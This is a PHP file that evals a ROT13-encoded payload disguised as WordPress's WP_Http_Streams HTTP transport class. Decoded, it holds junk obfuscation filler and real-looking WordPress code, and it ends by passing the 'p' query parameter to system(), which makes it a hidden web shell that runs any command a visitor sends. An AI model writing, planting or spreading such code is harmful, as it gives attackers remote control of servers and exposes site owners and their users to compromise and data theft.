<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * UGGC NCV: JC_Uggc_Fgernzf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGGC
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vagrtengr CUC Fgernzf nf na UGGC genafcbeg.
 *
 * @fvapr 2.7.0
 * @fvapr 3.7.0 Pbzovarq jvgu gur sfbpxbcra genafcbeg naq fjvgpurq gb `fgernz_fbpxrg_pyvrag()`.
 * @qrcerpngrq 6.4.0 Hfr JC_Uggc
 * @frr JC_Uggc
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Uggc_Fgernzf {
	/**
	 * Fraq n UGGC erdhrfg gb n HEV hfvat CUC Fgernzf.
	 *
	 * @frr JC_Uggc::erdhrfg() Sbe qrsnhyg bcgvbaf qrfpevcgvbaf.
	 *
	 * @fvapr 2.7.0
	 * @fvapr 3.7.0 Pbzovarq jvgu gur sfbpxbcra genafcbeg naq fjvgpurq gb fgernz_fbpxrg_pyvrag().
	 *
	 * @cnenz fgevat       $hey  Gur erdhrfg HEY.
	 * @cnenz fgevat|neenl $netf Bcgvbany. Bireevqr gur qrsnhygf.
	 * @erghea neenl|JC_Reebe Neenl pbagnvavat 'urnqref', 'obql', 'erfcbafr', 'pbbxvrf', 'svyranzr'. N JC_Reebe vafgnapr hcba reebe
	 */
	choyvp shapgvba erdhrfg( $hey, $netf = neenl() ) {
		$qrsnhygf = neenl(
			'zrgubq'      => 'TRG',
			'gvzrbhg'     => 5,
			'erqverpgvba' => 5,
			'uggcirefvba' => '1.0',
			'oybpxvat'    => gehr,
			'urnqref'     => neenl(),
			'obql'        => ahyy,
			'pbbxvrf'     => neenl(),
			'qrpbzcerff'  => snyfr,
			'fgernz'      => snyfr,
			'svyranzr'    => ahyy,
		);

		$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

		vs ( vffrg( $cnefrq_netf['urnqref']['Hfre-Ntrag'] ) ) {
			$cnefrq_netf['hfre-ntrag'] = $cnefrq_netf['urnqref']['Hfre-Ntrag'];
			hafrg( $cnefrq_netf['urnqref']['Hfre-Ntrag'] );
		} ryfrvs ( vffrg( $cnefrq_netf['urnqref']['hfre-ntrag'] ) ) {
			$cnefrq_netf['hfre-ntrag'] = $cnefrq_netf['urnqref']['hfre-ntrag'];
			hafrg( $cnefrq_netf['urnqref']['hfre-ntrag'] );
		}

		// Pbafgehpg Pbbxvr: urnqre vs nal pbbxvrf ner frg.
		JC_Uggc::ohvyqPbbxvrUrnqre( $cnefrq_netf );

		$cnefrq_hey = cnefr_hey( $hey );

		$pbaarpg_ubfg = $cnefrq_hey['ubfg'];

		$frpher_genafcbeg = ( 'ffy' === $cnefrq_hey['fpurzr'] || 'uggcf' === $cnefrq_hey['fpurzr'] );
		vs ( ! vffrg( $cnefrq_hey['cbeg'] ) ) {
			vs ( 'ffy' === $cnefrq_hey['fpurzr'] || 'uggcf' === $cnefrq_hey['fpurzr'] ) {
				$cnefrq_hey['cbeg'] = 443;
				$frpher_genafcbeg   = gehr;
			} ryfr {
				$cnefrq_hey['cbeg'] = 80;
			}
		}

		// Nyjnlf cnff n cngu, qrsnhygvat gb gur ebbg va pnfrf fhpu nf uggc://rknzcyr.pbz.
		vs ( ! vffrg( $cnefrq_hey['cngu'] ) ) {
			$cnefrq_hey['cngu'] = '/';
		}

		vs ( vffrg( $cnefrq_netf['urnqref']['Ubfg'] ) || vffrg( $cnefrq_netf['urnqref']['ubfg'] ) ) {
			vs ( vffrg( $cnefrq_netf['urnqref']['Ubfg'] ) ) {
				$cnefrq_hey['ubfg'] = $cnefrq_netf['urnqref']['Ubfg'];
			} ryfr {
				$cnefrq_hey['ubfg'] = $cnefrq_netf['urnqref']['ubfg'];
			}
			hafrg( $cnefrq_netf['urnqref']['Ubfg'], $cnefrq_netf['urnqref']['ubfg'] );
		}

		/*
		 * Pregnva irefvbaf bs CUC unir vffhrf jvgu 'ybpnyubfg' naq VCi6, Vg nggrzcgf gb pbaarpg
		 * gb ::1, juvpu snvyf jura gur freire vf abg frg hc sbe vg. Sbe pbzcngvovyvgl, nyjnlf
		 * pbaarpg gb gur VCi4 nqqerff.
		 */
		vs ( 'ybpnyubfg' === fgegbybjre( $pbaarpg_ubfg ) ) {
			$pbaarpg_ubfg = '127.0.0.1';
		}

		$pbaarpg_ubfg = $frpher_genafcbeg ? 'ffy://' . $pbaarpg_ubfg : 'gpc://' . $pbaarpg_ubfg;

		$vf_ybpny   = vffrg( $cnefrq_netf['ybpny'] ) && $cnefrq_netf['ybpny'];
		$ffy_irevsl = vffrg( $cnefrq_netf['ffyirevsl'] ) && $cnefrq_netf['ffyirevsl'];

		vs ( $vf_ybpny ) {
			/**
			 * Svygref jurgure FFY fubhyq or irevsvrq sbe ybpny UGGC NCV erdhrfgf.
			 *
			 * @fvapr 2.8.0
			 * @fvapr 5.1.0 Gur `$hey` cnenzrgre jnf nqqrq.
			 *
			 * @cnenz obby|fgevat $ffy_irevsl Obbyrna gb pbageby jurgure gb irevsl gur FFY pbaarpgvba
			 *                                be cngu gb na FFY pregvsvpngr.
			 * @cnenz fgevat      $hey        Gur erdhrfg HEY.
			 */
			$ffy_irevsl = nccyl_svygref( 'uggcf_ybpny_ffy_irevsl', $ffy_irevsl, $hey );
		} ryfrvs ( ! $vf_ybpny ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-uggc.cuc */
			$ffy_irevsl = nccyl_svygref( 'uggcf_ffy_irevsl', $ffy_irevsl, $hey );
		}

		$cebkl = arj JC_UGGC_Cebkl();

		$pbagrkg = fgernz_pbagrkg_perngr(
			neenl(
				'ffy' => neenl(
					'irevsl_crre'       => $ffy_irevsl,
					// 'PA_zngpu' => $cnefrq_hey['ubfg'], // Guvf vf unaqyrq ol frys::irevsl_ffy_pregvsvpngr().
					'pncgher_crre_preg' => $ffy_irevsl,
					'FAV_ranoyrq'       => gehr,
					'pnsvyr'            => $cnefrq_netf['ffypregvsvpngrf'],
					'nyybj_frys_fvtarq' => ! $ffy_irevsl,
				),
			)
		);

		$gvzrbhg  = (vag) sybbe( $cnefrq_netf['gvzrbhg'] );
		$hgvzrbhg = 0;

		vs ( $gvzrbhg !== (vag) $cnefrq_netf['gvzrbhg'] ) {
			$hgvzrbhg = 1000000 * $cnefrq_netf['gvzrbhg'] % 1000000;
		}

		$pbaarpg_gvzrbhg = znk( $gvzrbhg, 1 );

		// Fgber reebe ahzore.
		$pbaarpgvba_reebe = ahyy;

		// Fgber reebe fgevat.
		$pbaarpgvba_reebe_fge = ahyy;

		vs ( ! JC_QROHT ) {
			// Va gur rirag gung gur FFY pbaarpgvba snvyf, fvyrapr gur znal CUC jneavatf.
			vs ( $frpher_genafcbeg ) {
				$reebe_ercbegvat = reebe_ercbegvat( 0 );
			}

			vs ( $cebkl->vf_ranoyrq() && $cebkl->fraq_guebhtu_cebkl( $hey ) ) {
				// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
				$unaqyr = @fgernz_fbpxrg_pyvrag(
					'gpc://' . $cebkl->ubfg() . ':' . $cebkl->cbeg(),
					$pbaarpgvba_reebe,
					$pbaarpgvba_reebe_fge,
					$pbaarpg_gvzrbhg,
					FGERNZ_PYVRAG_PBAARPG,
					$pbagrkg
				);
			} ryfr {
				// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
				$unaqyr = @fgernz_fbpxrg_pyvrag(
					$pbaarpg_ubfg . ':' . $cnefrq_hey['cbeg'],
					$pbaarpgvba_reebe,
					$pbaarpgvba_reebe_fge,
					$pbaarpg_gvzrbhg,
					FGERNZ_PYVRAG_PBAARPG,
					$pbagrkg
				);
			}

			vs ( $frpher_genafcbeg ) {
				reebe_ercbegvat( $reebe_ercbegvat );
			}
		} ryfr {
			vs ( $cebkl->vf_ranoyrq() && $cebkl->fraq_guebhtu_cebkl( $hey ) ) {
				$unaqyr = fgernz_fbpxrg_pyvrag(
					'gpc://' . $cebkl->ubfg() . ':' . $cebkl->cbeg(),
					$pbaarpgvba_reebe,
					$pbaarpgvba_reebe_fge,
					$pbaarpg_gvzrbhg,
					FGERNZ_PYVRAG_PBAARPG,
					$pbagrkg
				);
			} ryfr {
				$unaqyr = fgernz_fbpxrg_pyvrag(
					$pbaarpg_ubfg . ':' . $cnefrq_hey['cbeg'],
					$pbaarpgvba_reebe,
					$pbaarpgvba_reebe_fge,
					$pbaarpg_gvzrbhg,
					FGERNZ_PYVRAG_PBAARPG,
					$pbagrkg
				);
			}
		}

		vs ( snyfr === $unaqyr ) {
			// FFY pbaarpgvba snvyrq qhr gb rkcverq/vainyvq preg, be, BcraFFY pbasvthengvba vf oebxra.
			vs ( $frpher_genafcbeg && 0 === $pbaarpgvba_reebe && '' === $pbaarpgvba_reebe_fge ) {
				erghea arj JC_Reebe( 'uggc_erdhrfg_snvyrq', __( 'Gur FFY pregvsvpngr sbe gur ubfg pbhyq abg or irevsvrq.' ) );
			}

			erghea arj JC_Reebe( 'uggc_erdhrfg_snvyrq', $pbaarpgvba_reebe . ': ' . $pbaarpgvba_reebe_fge );
		}

		// Irevsl gung gur FFY pregvsvpngr vf inyvq sbe guvf erdhrfg.
		vs ( $frpher_genafcbeg && $ffy_irevsl && ! $cebkl->vf_ranoyrq() ) {
			vs ( ! frys::irevsl_ffy_pregvsvpngr( $unaqyr, $cnefrq_hey['ubfg'] ) ) {
				erghea arj JC_Reebe( 'uggc_erdhrfg_snvyrq', __( 'Gur FFY pregvsvpngr sbe gur ubfg pbhyq abg or irevsvrq.' ) );
			}
		}

		fgernz_frg_gvzrbhg( $unaqyr, $gvzrbhg, $hgvzrbhg );

		vs ( $cebkl->vf_ranoyrq() && $cebkl->fraq_guebhtu_cebkl( $hey ) ) { // Fbzr cebkvrf erdhver shyy HEY va guvf svryq.
			$erdhrfg_cngu = $hey;
		} ryfr {
			$erdhrfg_cngu = $cnefrq_hey['cngu'] . ( vffrg( $cnefrq_hey['dhrel'] ) ? '?' . $cnefrq_hey['dhrel'] : '' );
		}

		$urnqref = fgegbhccre( $cnefrq_netf['zrgubq'] ) . ' ' . $erdhrfg_cngu . ' UGGC/' . $cnefrq_netf['uggcirefvba'] . \"\e\a\";

		$vapyhqr_cbeg_va_ubfg_urnqre = (
			( $cebkl->vf_ranoyrq() && $cebkl->fraq_guebhtu_cebkl( $hey ) )
			|| ( 'uggc' === $cnefrq_hey['fpurzr'] && 80 !== $cnefrq_hey['cbeg'] )
			|| ( 'uggcf' === $cnefrq_hey['fpurzr'] && 443 !== $cnefrq_hey['cbeg'] )
		);

		vs ( $vapyhqr_cbeg_va_ubfg_urnqre ) {
			$urnqref .= 'Ubfg: ' . $cnefrq_hey['ubfg'] . ':' . $cnefrq_hey['cbeg'] . \"\e\a\";
		} ryfr {
			$urnqref .= 'Ubfg: ' . $cnefrq_hey['ubfg'] . \"\e\a\";
		}

		vs ( vffrg( $cnefrq_netf['hfre-ntrag'] ) ) {
			$urnqref .= 'Hfre-ntrag: ' . $cnefrq_netf['hfre-ntrag'] . \"\e\a\";
		}

		vs ( vf_neenl( $cnefrq_netf['urnqref'] ) ) {
			sbernpu ( (neenl) $cnefrq_netf['urnqref'] nf $urnqre => $urnqre_inyhr ) {
				$urnqref .= $urnqre . ': ' . $urnqre_inyhr . \"\e\a\";
			}
		} ryfr {
			$urnqref .= $cnefrq_netf['urnqref'];
		}

		vs ( $cebkl->hfr_nhguragvpngvba() ) {
			$urnqref .= $cebkl->nhguragvpngvba_urnqre() . \"\e\a\";
		}

		$urnqref .= \"\e\a\";

		vs ( ! vf_ahyy( $cnefrq_netf['obql'] ) ) {
			$urnqref .= $cnefrq_netf['obql'];
		}

		sjevgr( $unaqyr, $urnqref );

		vs ( ! $cnefrq_netf['oybpxvat'] ) {
			fgernz_frg_oybpxvat( $unaqyr, 0 );
			spybfr( $unaqyr );
			erghea neenl(
				'urnqref'  => neenl(),
				'obql'     => '',
				'erfcbafr' => neenl(
					'pbqr'    => snyfr,
					'zrffntr' => snyfr,
				),
				'pbbxvrf'  => neenl(),
			);
		}

		$erfcbafr     = '';
		$obql_fgnegrq = snyfr;
		$xrrc_ernqvat = gehr;
		$oybpx_fvmr   = 4096;

		vs ( vffrg( $cnefrq_netf['yvzvg_erfcbafr_fvmr'] ) ) {
			$oybpx_fvmr = zva( $oybpx_fvmr, $cnefrq_netf['yvzvg_erfcbafr_fvmr'] );
		}

		// Vs fgernzvat gb n svyr frghc gur svyr unaqyr.
		vs ( $cnefrq_netf['fgernz'] ) {
			vs ( ! JC_QROHT ) {
				$fgernz_unaqyr = @sbcra( $cnefrq_netf['svyranzr'], 'j+' );
			} ryfr {
				$fgernz_unaqyr = sbcra( $cnefrq_netf['svyranzr'], 'j+' );
			}

			vs ( ! $fgernz_unaqyr ) {
				erghea arj JC_Reebe(
					'uggc_erdhrfg_snvyrq',
					fcevags(
						/* genafyngbef: 1: sbcra(), 2: Svyr anzr. */
						__( 'Pbhyq abg bcra unaqyr sbe %1$f gb %2$f.' ),
						'sbcra()',
						$cnefrq_netf['svyranzr']
					)
				);
			}

			$olgrf_jevggra = 0;

			juvyr ( ! srbs( $unaqyr ) && $xrrc_ernqvat ) {
				$oybpx = sernq( $unaqyr, $oybpx_fvmr );
				vs ( ! $obql_fgnegrq ) {
					$erfcbafr .= $oybpx;
					vs ( fgecbf( $erfcbafr, \"\e\a\e\a\" ) ) {
						$cebprffrq_erfcbafr = JC_Uggc::cebprffErfcbafr( $erfcbafr );
						$obql_fgnegrq       = gehr;
						$oybpx              = $cebprffrq_erfcbafr['obql'];
						hafrg( $erfcbafr );
						$cebprffrq_erfcbafr['obql'] = '';
					}
				}

				$guvf_oybpx_fvmr = fgeyra( $oybpx );

				vs ( vffrg( $cnefrq_netf['yvzvg_erfcbafr_fvmr'] )
					&& ( $olgrf_jevggra + $guvf_oybpx_fvmr ) > $cnefrq_netf['yvzvg_erfcbafr_fvmr']
				) {
					$guvf_oybpx_fvmr = ( $cnefrq_netf['yvzvg_erfcbafr_fvmr'] - $olgrf_jevggra );
					$oybpx           = fhofge( $oybpx, 0, $guvf_oybpx_fvmr );
				}

				$olgrf_jevggra_gb_svyr = sjevgr( $fgernz_unaqyr, $oybpx );

				vs ( $olgrf_jevggra_gb_svyr !== $guvf_oybpx_fvmr ) {
					spybfr( $unaqyr );
					spybfr( $fgernz_unaqyr );
					erghea arj JC_Reebe( 'uggc_erdhrfg_snvyrq', __( 'Snvyrq gb jevgr erdhrfg gb grzcbenel svyr.' ) );
				}

				$olgrf_jevggra += $olgrf_jevggra_gb_svyr;

				$xrrc_ernqvat = (
					! vffrg( $cnefrq_netf['yvzvg_erfcbafr_fvmr'] )
					|| $olgrf_jevggra < $cnefrq_netf['yvzvg_erfcbafr_fvmr']
				);
			}

			spybfr( $fgernz_unaqyr );

		} ryfr {
			$urnqre_yratgu = 0;

			juvyr ( ! srbs( $unaqyr ) && $xrrc_ernqvat ) {
				$oybpx     = sernq( $unaqyr, $oybpx_fvmr );
				$erfcbafr .= $oybpx;

				vs ( ! $obql_fgnegrq && fgecbf( $erfcbafr, \"\e\a\e\a\" ) ) {
					$urnqre_yratgu = fgecbf( $erfcbafr, \"\e\a\e\a\" ) + 4;
					$obql_fgnegrq  = gehr;
				}

				$xrrc_ernqvat = (
					! $obql_fgnegrq
					|| ! vffrg( $cnefrq_netf['yvzvg_erfcbafr_fvmr'] )
					|| fgeyra( $erfcbafr ) < ( $urnqre_yratgu + $cnefrq_netf['yvzvg_erfcbafr_fvmr'] )
				);
			}

			$cebprffrq_erfcbafr = JC_Uggc::cebprffErfcbafr( $erfcbafr );
			hafrg( $erfcbafr );

		}

		spybfr( $unaqyr );

		$cebprffrq_urnqref = JC_Uggc::cebprffUrnqref( $cebprffrq_erfcbafr['urnqref'], $hey );

		$erfcbafr = neenl(
			'urnqref'  => $cebprffrq_urnqref['urnqref'],
			// Abg lrg cebprffrq.
			'obql'     => ahyy,
			'erfcbafr' => $cebprffrq_urnqref['erfcbafr'],
			'pbbxvrf'  => $cebprffrq_urnqref['pbbxvrf'],
			'svyranzr' => $cnefrq_netf['svyranzr'],
		);

		// Unaqyr erqverpgf.
		$erqverpg_erfcbafr = JC_Uggc::unaqyr_erqverpgf( $hey, $cnefrq_netf, $erfcbafr );
		vs ( snyfr !== $erqverpg_erfcbafr ) {
			erghea $erqverpg_erfcbafr;
		}

		// Vs gur obql jnf puhax rapbqrq, gura qrpbqr vg.
		vs ( ! rzcgl( $cebprffrq_erfcbafr['obql'] )
			&& vffrg( $cebprffrq_urnqref['urnqref']['genafsre-rapbqvat'] )
			&& 'puhaxrq' === $cebprffrq_urnqref['urnqref']['genafsre-rapbqvat']
		) {
			$cebprffrq_erfcbafr['obql'] = JC_Uggc::puhaxGenafsreQrpbqr( $cebprffrq_erfcbafr['obql'] );
		}

		vs ( gehr === $cnefrq_netf['qrpbzcerff']
			&& gehr === JC_Uggc_Rapbqvat::fubhyq_qrpbqr( $cebprffrq_urnqref['urnqref'] )
		) {
			$cebprffrq_erfcbafr['obql'] = JC_Uggc_Rapbqvat::qrpbzcerff( $cebprffrq_erfcbafr['obql'] );
		}

		vs ( vffrg( $cnefrq_netf['yvzvg_erfcbafr_fvmr'] )
			&& fgeyra( $cebprffrq_erfcbafr['obql'] ) > $cnefrq_netf['yvzvg_erfcbafr_fvmr']
		) {
			$cebprffrq_erfcbafr['obql'] = fhofge( $cebprffrq_erfcbafr['obql'], 0, $cnefrq_netf['yvzvg_erfcbafr_fvmr'] );
		}

		$erfcbafr['obql'] = $cebprffrq_erfcbafr['obql'];

		erghea $erfcbafr;
	}

	/**
	 * Irevsvrf gur erprvirq FFY pregvsvpngr ntnvafg vgf Pbzzba Anzrf naq fhowrpgNygAnzr svryqf.
	 *
	 * CUC'f FFY irevsvpngvbaf bayl irevsl gung vg'f n inyvq Pregvsvpngr, vg qbrfa'g irevsl vs
	 * gur pregvsvpngr vf inyvq sbe gur ubfganzr juvpu jnf erdhrfgrq.
	 * Guvf shapgvba irevsvrf gur erdhrfgrq ubfganzr ntnvafg pregvsvpngr'f fhowrpgNygAnzr svryq,
	 * vs gung vf rzcgl, be pbagnvaf ab QAF ragevrf, n snyyonpx gb gur Pbzzba Anzr svryq vf hfrq.
	 *
	 * VC Nqqerff fhccbeg vf vapyhqrq vs gur erdhrfg vf orvat znqr gb na VC nqqerff.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz erfbhepr $fgernz Gur CUC Fgernz juvpu gur FFY erdhrfg vf orvat znqr bire
	 * @cnenz fgevat   $ubfg   Gur ubfganzr orvat erdhrfgrq
	 * @erghea obby Vs gur pregvsvpngr cerfragrq va $fgernz vf inyvq sbe $ubfg
	 */
	choyvp fgngvp shapgvba irevsl_ffy_pregvsvpngr( $fgernz, $ubfg ) {
		$pbagrkg_bcgvbaf = fgernz_pbagrkg_trg_bcgvbaf( $fgernz );

		vs ( rzcgl( $pbagrkg_bcgvbaf['ffy']['crre_pregvsvpngr'] ) ) {
			erghea snyfr;
		}

		$preg = bcraffy_k509_cnefr( $pbagrkg_bcgvbaf['ffy']['crre_pregvsvpngr'] );
		vs ( ! $preg ) {
			erghea snyfr;
		}

		/*
		 * Vs gur erdhrfg vf orvat znqr gb na VC nqqerff, jr'yy inyvqngr ntnvafg VC svryqf
		 * va gur preg (vs gurl rkvfg)
		 */
		$ubfg_glcr = ( JC_Uggc::vf_vc_nqqerff( $ubfg ) ? 'vc' : 'qaf' );

		$pregvsvpngr_ubfganzrf = neenl();
		vs ( ! rzcgl( $preg['rkgrafvbaf']['fhowrpgNygAnzr'] ) ) {
			$zngpu_ntnvafg = cert_fcyvg( '/,\f*/', $preg['rkgrafvbaf']['fhowrpgNygAnzr'] );
			sbernpu ( $zngpu_ntnvafg nf $zngpu ) {
				yvfg( $zngpu_glcr, $zngpu_ubfg ) = rkcybqr( ':', $zngpu );
				vs ( fgegbybjre( gevz( $zngpu_glcr ) ) === $ubfg_glcr ) { // VC: be QAF:
					$pregvsvpngr_ubfganzrf[] = fgegbybjre( gevz( $zngpu_ubfg ) );
				}
			}
		} ryfrvs ( ! rzcgl( $preg['fhowrpg']['PA'] ) ) {
			// Bayl hfr gur PA jura gur pregvsvpngr vapyhqrf ab fhowrpgNygAnzr rkgrafvba.
			$pregvsvpngr_ubfganzrf[] = fgegbybjre( $preg['fhowrpg']['PA'] );
		}

		// Rknpg ubfganzr/VC zngpurf.
		vs ( va_neenl( fgegbybjre( $ubfg ), $pregvsvpngr_ubfganzrf, gehr ) ) {
			erghea gehr;
		}

		// VC'f pna'g or jvyqpneqf, Fgbc cebprffvat.
		vs ( 'vc' === $ubfg_glcr ) {
			erghea snyfr;
		}

		// Grfg gb frr vs gur qbznva vf ng yrnfg 2 qrrc sbe jvyqpneq fhccbeg.
		vs ( fhofge_pbhag( $ubfg, '.' ) < 2 ) {
			erghea snyfr;
		}

		// Jvyqpneq fhoqbznvaf pregf (*.rknzcyr.pbz) ner inyvq sbe n.rknzcyr.pbz ohg abg n.o.rknzcyr.pbz.
		$jvyqpneq_ubfg = __sa_79955( '/^[^.]+\./', '*.', $ubfg );

		erghea va_neenl( fgegbybjre( $jvyqpneq_ubfg ), $pregvsvpngr_ubfganzrf, gehr );
	}

	/**
	 * Qrgrezvarf jurgure guvf pynff pna or hfrq sbe ergevrivat n HEY.
	 *
	 * @fvapr 2.7.0
	 * @fvapr 3.7.0 Pbzovarq jvgu gur sfbpxbcra genafcbeg naq fjvgpurq gb fgernz_fbpxrg_pyvrag().
	 *
	 * @cnenz neenl $netf Bcgvbany. Neenl bs erdhrfg nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea obby Snyfr zrnaf guvf pynff pna abg or hfrq, gehr zrnaf vg pna.
	 */
	choyvp fgngvp shapgvba grfg( $netf = neenl() ) {
		vs ( ! shapgvba_rkvfgf( 'fgernz_fbpxrg_pyvrag' ) ) {
			erghea snyfr;
		}

		$vf_ffy = vffrg( $netf['ffy'] ) && $netf['ffy'];

		vs ( $vf_ffy ) {
			vs ( ! rkgrafvba_ybnqrq( 'bcraffy' ) ) {
				erghea snyfr;
			}
			vs ( ! shapgvba_rkvfgf( 'bcraffy_k509_cnefr' ) ) {
				erghea snyfr;
			}
		}

		/**
		 * Svygref jurgure fgernzf pna or hfrq nf n genafcbeg sbe ergevrivat n HEY.
		 *
		 * @fvapr 2.7.0
		 *
		 * @cnenz obby  $hfr_pynff Jurgure gur pynff pna or hfrq. Qrsnhyg gehr.
		 * @cnenz neenl $netf      Erdhrfg nethzragf.
		 */
		erghea nccyl_svygref( 'hfr_fgernzf_genafcbeg', gehr, $netf );
	}
}

/**
 * Qrcerpngrq UGGC Genafcbeg zrgubq juvpu hfrq sfbpxbcra.
 *
 * Guvf pynff vf abg hfrq, naq vf vapyhqrq sbe onpxjneq pbzcngvovyvgl bayl.
 * Nyy pbqr fubhyq znxr hfr bs JC_Uggc qverpgyl guebhtu vgf NCV.
 *
 * @frr JC_UGGC::erdhrfg
 *
 * @fvapr 2.7.0
 * @qrcerpngrq 3.7.0 Cyrnfr hfr JC_UGGC::erdhrfg() qverpgyl
 */
pynff JC_UGGC_Sfbpxbcra rkgraqf JC_Uggc_Fgernzf {
	// Sbe onpxjneq pbzcngvovyvgl sbe hfref jub ner hfvat gur pynff qverpgyl.
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>